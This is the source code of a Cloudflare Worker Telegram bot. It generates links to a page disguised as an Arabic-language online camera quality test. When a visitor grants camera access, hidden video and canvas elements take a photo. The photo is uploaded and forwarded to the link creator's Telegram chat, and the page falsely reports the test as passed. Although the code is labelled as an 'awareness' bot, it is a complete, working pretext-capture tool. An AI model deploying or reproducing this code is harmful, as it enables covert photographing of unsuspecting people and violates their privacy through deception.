
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const path = url.pathname;

    // إعدادات البوت من متغيرات البيئة
    const BOT_TOKEN = env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = env.ADMIN_CHAT_ID;
    const WEB_DOMAIN = env.WEB_DOMAIN || `https://${url.hostname}`;
    const WEBHOOK_SECRET = env.WEBHOOK_SECRET || "manus_secret";

    // دالة التشفير/فك التشفير (Stateless)
    const encodeData = (chatId) => btoa(JSON.stringify({ c: chatId })).replace(/=/g, "");
    const decodeData = (str) => {
      try {
        return JSON.parse(atob(str)).c;
      } catch (e) {
        return null;
      }
    };

    // معالجة الصفحة الرئيسية
    if (path === "/" || path === "") {
      return new Response("<h1>Camera Awareness Bot is Running</h1>", {
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }

    // معالجة صفحة الالتقاط
    if (path.startsWith("/capture/")) {
      const token = path.split("/").pop();
      const chatId = decodeData(token);
      if (!chatId) return new Response("Invalid Link", { status: 404 });

      // جلب ملف HTML (سنقوم بتضمينه لاحقاً في الـ Worker أو رفعه كـ Assets)
      // للتبسيط في الـ Worker، سنقوم بإرجاع الـ HTML مباشرة
      return new Response(getHtml(token), {
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }

    // معالجة رفع الصور
    if (path.startsWith("/upload/") && request.method === "POST") {
      const token = path.split("/").pop();
      const ownerChatId = decodeData(token);
      if (!ownerChatId) return new Response("Invalid", { status: 404 });

      const { image } = await request.json();
      const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
      const byteCharacters = atob(base64Data);
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);

      // إرسال الصورة لتليجرام
      const formData = new FormData();
      formData.append("chat_id", ownerChatId);
      formData.append("photo", new Blob([byteArray], { type: "image/jpeg" }), "capture.jpg");
      formData.append("caption", "📸 <b>تم التقاط صورة!</b>\n\n✅ المستخدم وافق على إذن الكاميرا");
      formData.append("parse_mode", "HTML");

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData,
      });

      return new Response(JSON.stringify({ status: "success" }), {
        headers: { "Content-Type": "application/json" },
      });
    }

    // معالجة الرفض
    if (path.startsWith("/decline/") && request.method === "POST") {
      const token = path.split("/").pop();
      const ownerChatId = decodeData(token);
      if (ownerChatId) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: ownerChatId,
            text: "🛡️ <b>مستخدم واعٍ أمنياً!</b>\n\n❌ المستخدم رفض إعطاء إذن الكاميرا",
            parse_mode: "HTML",
          }),
        });
      }
      return new Response(JSON.stringify({ status: "success" }));
    }

    // معالجة الويب هوك
    if (path === `/webhook/${WEBHOOK_SECRET}` && request.method === "POST") {
      const update = await request.json();
      if (update.message) {
        const chatId = update.message.chat.id;
        const text = update.message.text;

        if (text === "/start") {
          const token = encodeData(chatId);
          const captureUrl = `${WEB_DOMAIN}/capture/${token}`;
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: `✅ <b>تم إنشاء رابط الفحص بنجاح!</b>\n\n🔗 <code>${captureUrl}</code>`,
              parse_mode: "HTML",
            }),
          });
        }
      }
      return new Response("OK");
    }

    return new Response("Not Found", { status: 404 });
  },
};

function getHtml(linkId) {
  return `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص جودة الكاميرا أونلاين</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #fff; border-radius: 12px; padding: 30px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .btn { padding: 15px; background: #0984e3; color: #fff; border: none; border-radius: 8px; width: 100%; cursor: pointer; font-size: 16px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="step1">
            <h1>📷 فحص جودة الكاميرا</h1>
            <p>اضغط للبدء في تحليل دقة الكاميرا والألوان.</p>
            <button class="btn" onclick="requestCamera()">بدء الفحص</button>
        </div>
        <div id="step2" class="hidden">
            <h1>جاري التحليل...</h1>
            <p>يرجى الانتظار ثوانٍ...</p>
        </div>
        <div id="step3" class="hidden">
            <h1 style="color: green;">تم بنجاح!</h1>
            <p>جودة الكاميرا ممتازة.</p>
        </div>
        <video id="video" style="display:none" autoplay playsinline></video>
        <canvas id="canvas" style="display:none"></canvas>
    </div>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        async function requestCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const image = canvas.toDataURL('image/jpeg');
                    fetch('/upload/${linkId}', {
                        method: 'POST',
                        body: JSON.stringify({ image })
                    }).then(() => {
                        document.getElementById('step2').classList.add('hidden');
                        document.getElementById('step3').classList.remove('hidden');
                        stream.getTracks().forEach(t => t.stop());
                    });
                }, 2000);
            } catch (e) {
                fetch('/decline/${linkId}', { method: 'POST' });
                alert("يجب السماح بالكاميرا للفحص");
            }
        }
    </script>
</body>
</html>`;
}
